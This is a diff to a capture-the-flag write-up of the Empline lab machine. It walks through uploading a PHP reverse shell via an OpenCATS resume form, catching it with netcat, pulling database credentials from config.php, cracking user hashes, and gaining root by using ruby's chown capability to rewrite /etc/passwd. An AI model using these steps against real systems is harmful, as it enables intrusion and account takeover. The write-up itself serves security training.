@@ -14,7 +14,7 @@ Are you good enough to apply for this job?
 - [Tools Used](#tools-used)
 - [Enumeration of ports and services](#enumeration-of-ports-and-services)
 - [Enumerating the web server](#enumerating-the-web-server)
-- [Uploading a Webshell](#uploading-a-webshell)
+- [Uploading a web shell](#uploading-a-web-shell)
 - [Reverse shell connection](#reverse-shell-connection)
 - [Horizontal privilege escalation](#horizontal-privilege-escalation)
   - [MySQL Database](#mysql-database)
@@ -40,9 +40,10 @@ tmux
 
 ## Enumeration of ports and services
 
+Like most of the time, when you don't know what you are facing, just scan with `nmap` and check what services are running on the target machine.
+
 ````commandline
-$ sudo nmap -sCV -p- $IP_TARGET
-[sudo] password for itchy: 
+# nmap -sCV -p- $IP_TARGET
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-19 20:09 CEST
 Nmap scan report for empline.thm (10.10.132.122)
 Host is up (0.030s latency).
@@ -72,7 +73,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 21.32 seconds
 ```` 
 
+Not so much running on this server. I'm a bit surprised.
+
 ## Enumerating the web server
+
+Like there's a web server, of course, let's enumerate that and gather information about it.
 
 ````commandline
 $ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u $IP_TARGET -t 50
@@ -103,34 +108,32 @@ When browsing on the website, we discover a beautiful website. All links are anc
 
 ![alt text](files/webserver_01.png "Web server")
 
-So we have to adjust the `/etc/hosts` as root user.
+So we have to adjust the `/etc/hosts` as root user on our host machine.
 
 ````commandline
 10.10.132.122    empline.thm
 10.10.132.122    job.empline.thm
 ````
 
-Looking at the <http://job.empline.thm/> gives us a login screen for the [OpenCATS Application Tracking System](https://www.opencats.org/).
+_**Spoiler alert:** Looking up on Google reveals there are a few vulnerabilities about `OpenCATS`. See the section [Other Methods](#other-methods) below where I list all know CVE so far about OpenCATS so far. And i'm pretty sure, looking at this apache version, we have plenty other possibilities to take ownership of this machine. However, during my challenge, I did not have had to make use of these know vulnerabilities. I made my path differently. To be open, I just have looked around my way and tried a few things. After I finished rooting  this box I started to dig deeper to finish this writeup and found out there are some interesting know vulnerabilities._
 
-As side note my `Malwarebytes Browser Guard` blocks this website for the `riskware` reason on my Windows machine.
-
-_**Spoiler alert:** Looking up on Google reveals there are a few vulnerabilities. However, during my challenge, I did not have had to make use of these know vulnerabilities. I made my path differently. To be open, I just have looked around my way and tried a few things. After I finished rooting  this box I started to dig deeper to finish this writeup and found out there are some interesting know vulnerabilities._
+Looking at the <http://job.empline.thm/> gives us a login screen for the [OpenCATS Application Tracking System](https://www.opencats.org/). As side note my `Malwarebytes Browser Guard` blocks this `OpenCATS` website on my Windows box for the `riskware` reason. That's already a red flag, honestly.
 
 ![alt text](files/webserver_02.png "Web server")
 
-Going to <http://job.empline.thm/careers/> brings us to a job board with a bit of information about his company. They also invite us to view the `current openings positions` which is a link.
+Going to <http://job.empline.thm/careers/> brings us to a job board with a bit of information about this company. They also invite us to view the `current openings positions` with a link.
 
 ![alt text](files/webserver_03.png "Web server")
 
-With only one job available (not on picture), when we click on it we see that `Position Details` for the `Mobile Dev` job opportunity. We have a bit of information about this job opportunity. Interesting is that we can press the `Apply to Position` link on the right side.
+With only one job available (not on picture), when we click on it, we see that `Position Details` for the `Mobile Dev` job opportunity. We have a bit of information about this job opportunity. Interesting is that we can `Apply to Position` when pressing the link on the right side.
 
 ![alt text](files/webserver_04.png "Web server")
 
-We can apply for this job opportunity by filling in all the required fields.
+We can apply for this job opportunity by filling in all the required fields and by uploading our malware, excuse me, our resume.
 
 ![alt text](files/webserver_05.png "Web server")
 
-As we found out this new website and the upload capabilities, it's always wise to enumerate it. We see that `gobuster` found an `upload` folder. Probably for the applications that are submitted.
+As we found out this new website and the upload capabilities, it's always wise to enumerate this web server again, but more targeted. We see that `gobuster` found an `upload` folder. Probably for the applications that are submitted.
 
 ````commandline
 $ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u job.empline.thm -t 50
@@ -174,13 +177,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ````
 
-## Uploading a Webshell
+## Uploading a Web shell
 
-As we have the opportunity to upload our resume, We need to investigate on this. And apparently this web interface is able to populate the fields. Did not try that out. I was more interested to try other fancy things, to upload some webshell.
+As we have the opportunity to upload our resume, We need to investigate on this. And apparently this web interface is able to populate the fields. Which is very interesting as I bet we can upload some fancy malicious PDF, doc or whatever fancy file to play around with eventual XXE or other vulnerabilities. Did not try that out. As I first try out the basics, to upload some web shell.
 
-So I filled in all the required fields marked with an asterisks. The first attempt, I submitted my application with a simple png image file. Just to test out the system. I discovered that there is some bug and that the system did not upload my attachment. Tried that with different kind of files to be sure that the system did not filter out my attachment. Found out that we need to `Browse` and `Upload` twice our file so that it get really attached and uploaded into the `upload` folder on the web server. On the web interface, we will even see that our second attachment will be named c`opy...`. That copy file will be not uploaded. The original file name will. This is pretty confusing, maybe not a bug, but at least, the interface is confusing.
+So I filled in all the required fields marked with an asterisks. The first attempt, I submitted my application with a simple png image file. Just to test out the system. I discovered that there is some bug and that the system did not upload my attachment, my png image file. Tried that with different kind of files to be sure that the system did not filter out my attachment. Found out that we need to `Browse` and `Upload` twice our file so that it get really attached and uploaded into the `upload` folder on the web server when we submit our application. On the web interface, we will even see that our second attachment will be named `<filename> Copy...`. That copy file will be not uploaded. The original file name will. This is pretty confusing, maybe not a bug, but at least, the interface is confusing.
 
-So after a few trial and errors, I took the web shell available by default on my `kali` machine and located at `/usr/share/webshells/php/php-reverse-shell.php`. I copied to my `~/tools` directory and named it `webshell.php`. Adjusted the `$ip` variable to that of my `kali` host machine. Left the port onn `4444`.
+**ANYWAY, THIS IS ABSOLUTE NOT NORMAL WE CAN UPLOAD A PLAIN PHP WEB SHELL THAT WAY. ACTUALLY, I TRIED OUT ALL FANCY NASTY THINGS AND EVERYTHING IS ALLOWED. THERE IS REALLY SOMETHING GOING VERY BAD WITH THIS TOOL. THIS IS WAY TOO EASY AND DANGEROUS AS TOOL ON THIS SERVER.**
+
+So after a few trial and errors, I took the web shell available by default on my `kali` machine and located at `/usr/share/webshells/php/php-reverse-shell.php`. I copied to my `~/tools` directory and named it `webshell.php`. Adjusted the `$ip` variable to that of my `kali` attackers machine. Left the port on `4444`.
 
 ![alt text](files/webserver_06.png "Web server")
 
@@ -192,7 +197,7 @@ So time to set up our listener on our host machine:
 nc -nlvp 4444
 ````
 
-And now run our `webshell.php` file to get connection:
+And now run our `webshell.php` file to get connection by pointing the browser to <http://job.empline.thm/upload/careerportaladd/webshell.php>.
 
 ````commandline
 $ nc -lnvp 4444
@@ -227,7 +232,7 @@ www-data@empline:/$ pwd
 www-data@empline:/$
 ````
 
-Now that the shell is stable, we need to adjust the `tty` size of the terminal. As otherwise, using for example `nano` or anything like that, the size of the terminal is not okay. Like I'm using `tmux`, I first open a new window `<prefix> + c`, and get the `tty` info from there.
+Now that the shell is stable, we need to adjust the `tty` size of the terminal. As otherwise, using for example `vim`, `nano` or anything like that we will be in troubles. Like I'm using `tmux`, I first open a new window `<prefix> + c`, and get the `tty` info from there.
 
 ````commandline
 $ stty -a
@@ -245,9 +250,11 @@ Then I take the rows and columns information and set it in that other window whe
 www-data@empline:/$ stty rows 76 columns 317
 ````
 
+Hopla, we are ready to go...
+
 ## Horizontal privilege escalation
 
-Looking out for usable files and a way to escalate. But at this stage could not get anything usefull at all.
+Looking out for usable files and a way to escalate. But at this stage could not get anything useful at all.
 
 ````commandline
 www-data@empline:/$ ls -lah /home/
@@ -338,7 +345,7 @@ www-data@empline:/var/www$
 
 ### MySQL Database
 
-So, I ended up looking on the <https://forums.opencats.org/> for more information about where the database config files is stored. I found that it is stored in a file called `config.php`.
+So, I ended up looking on the <https://forums.opencats.org/> and using the nice `Search Form` for more information about where the database config files is stored. I found that it is stored in a file called `config.php`.
 
 ````commandline
 www-data@empline:/var/www$ find . -name config.php
@@ -346,7 +353,7 @@ www-data@empline:/var/www$ find . -name config.php
 ./opencats/test/config.php
 ````
 
-Here is a stripped out version of the `config.php` file which contains the database credentials.
+Looking into that file, of course, found the database credentials. Here is a stripped out version of the `config.php`.
 
 ````commandline
 opencats/config.php:define('DATABASE_USER', 'james');
@@ -355,9 +362,9 @@ opencats/config.php:define('DATABASE_HOST', 'localhost');
 opencats/config.php:define('DATABASE_NAME', 'opencats');
 ````
 
-Tried to use these credentials to log in but there is no credentials reuse for the shell user `george` and `ubuntu`.
+Tried to use these credentials to log in but there is no credentials reuse for the shell user `george` and `ubuntu` and `root`.
 
-So continuing looking for credentials and connected to the `MySQL` database.
+So continuing looking for credentials and connected to the `MySQL` database. Looking which database are available, you never know if you get even more free goodies.
 
 ````commandline
 www-data@empline:/var/www$ mysql -u james -p
@@ -387,7 +394,7 @@ Database changed
 MariaDB [opencats]>
 ````
 
-Looking to what tables are there for this Content Management System.
+Looking what tables there are in this database about this `OpenCATS` tool.
 
 ````commandline
 MariaDB [opencats]> show tables;
@@ -454,7 +461,7 @@ MariaDB [opencats]> show tables;
 MariaDB [opencats]>
 ````
 
-We find the `OpenCATS` credentials of user `admin`, `james`, and `george` in the `user` table, but this methods is pretty messy.
+We find the `OpenCATS` credentials of user `admin`, `james`, and `george` in the `user` table, but the following methods is pretty messy to do, but it's fast, and you get good glance at what you need in no time.
 
 ````commandline
 MariaDB [opencats]> select * from user;
@@ -501,7 +508,7 @@ MariaDB [opencats]> describe user;
 MariaDB [opencats]>
 ````
 
-We are only interested into the username, email, password, and it's also good to know their access level. So let's fetch that.
+We are only interested into the `username`, `email`, `password`, and it's also good to know their `access level`. So let's fetch that. (I REDACTED the password hashes)
 
 ````commandline
 MariaDB [opencats]> select user_name, email, password, access_level from user;
@@ -518,7 +525,7 @@ MariaDB [opencats]> select user_name, email, password, access_level from user;
 MariaDB [opencats]>
 ````
 
-Looking up on <https://crackstation.net/> with these hashes we got from the `MySQL` table `user` of that `OpenCATS` database, and we get the password of user `george`. For the other users we could not get the password. Did not take the time to crack these other user accounts with `john` or `hashcat`.
+Looking up on [CrackStation](https://crackstation.net) with these hashes we got from the `MySQL` table `user`, and we get the password of user `george`. For the other users we could not get the password. Did not take the time to crack these other user accounts with `john` or `hashcat` or whatever other tool. I god food, so let's consume it.
 
 ````commandline
 george:REDACTED
@@ -538,9 +545,9 @@ george@empline:~$ cat user.txt
 
 ## Vertical privilege escalation
 
-This user has no `sudo` rights, no `crontab` and no `SUID` bits found.
+This user `george` has no `sudo` rights, no `crontab` and no `SUID` bits found.
 
-However, we can get the capabilities of the user with `getcap`. Which reveals somethings interesting about `ruby` which has `chown` capabilities with superuser rights.
+However, we can get the capabilities of the user with `getcap`. Which reveals something interesting about `ruby` which has `chown` capabilities with superuser rights. Reading the `man capabilities` (or the [online version](https://man7.org/linux/man-pages/man7/capabilities.7.html)) will give us nice information.
 
 ````commandline
 $ getcap -r / 2>/dev/null
@@ -548,14 +555,16 @@ $ getcap -r / 2>/dev/null
 /usr/local/bin/ruby = cap_chown+ep
 ````
 
-As I don't know anything about Ruby actually, I had to do a bit of research about "ruby one liner" on Google. This gave a few hints which I tried out, but it did not work like I expected. I admit it that I did not do a lot of research about that.
+As I don't know anything about `Ruby` actually, I had to do a bit of research about "ruby one liner" on Google. On how to execute a `Ruby` command onto one line if you want, like this is possible with `Python` and many other language. This gave a few hints which I tried out, but it did not work like I expected. Well, the one-liners did work as expected, but I expected more, owning that `/etc/passwd` file which failed so far. I admit it that I did not do a lot of research about that.
 
 ````commandline
 george@empline:~$ /usr/local/bin/ruby -e 'system("chown george /etc/passwd" )'
 chown: changing ownership of '/etc/passwd': Operation not permitted
 ````
 
-This way does work. Got the type from a discord user that we actually need to make use of the ruby's `chown` function. Which actually make sense in this context. I Had to do more research, I confess. But you know, it's all about sharing knowledge, on website or via your contacts :-)
+Using the `system` function with `whoami` also returned unexpected information. Well no, not exactly, it returned `george`. But I wanted it return `root`. So this was the `PoC`, the Proof of Concept I was not on the good path.
+
+Got a tip from a discord user (Thanks `Rushi`!) that we actually need to make use of the Ruby's `chown` function. Which actually make sense in this context. I Had to do more research, I confess. But you know, it's all about sharing knowledge, on Google, website or via your contacts :-) Anyway, I did my homework late like we say, and you can get more information in the [Ruby FileUtils](https://ruby-doc.org/stdlib-2.4.1/libdoc/fileutils/rdoc/FileUtils.html).
 
 ````commandline
 george@empline:/$ id
@@ -567,7 +576,9 @@ george@empline:~$ ls -lah /etc/passwd
 -rw-r--r-- 1 george george 1.7K Jul 20 19:48 /etc/passwd
 ````
 
-So let's generate a new password hash so that we can add this to the `/etc/passwd` which we own.
+So, user `george` is owning the `/etc/passwd` file. Great!!
+
+So let's generate a new password hash so that we can add this to the `/etc/passwd` for the root user. As we don't know the password of `root`, we will give him a new one the fancy way.
 
 ````commandline
 george@empline:/$ openssl passwd mynewpass
@@ -590,6 +601,10 @@ root@empline:/home/george# cat /root/root.txt
 74*****d0556e9c6f22e6f54b*****d5
 ````
 
+Mission accomplished!
+
+Hopefully you enjoyed as much as I did :-)
+
 ## Other methods
 
 There are other possible methods as there are some know CVE interesting to check out. I did not try them out as I could find my way to have full root access, including the `MySQL` database along the way.
@@ -601,7 +616,3 @@ There are other possible methods as there are some know CVE interesting to check
 ## Maybe yet other methods
 
 - [CVE-2019-0211](https://www.exploit-db.com/exploits/46676) - As this is about `Apache` version `2.4.29` this exploit can maybe also work out to gain root privilege: <https://www.exploit-db.com/exploits/46676>
-
-Mission accomplished!
-
-Hopefully you enjoyed as much as I did :-)
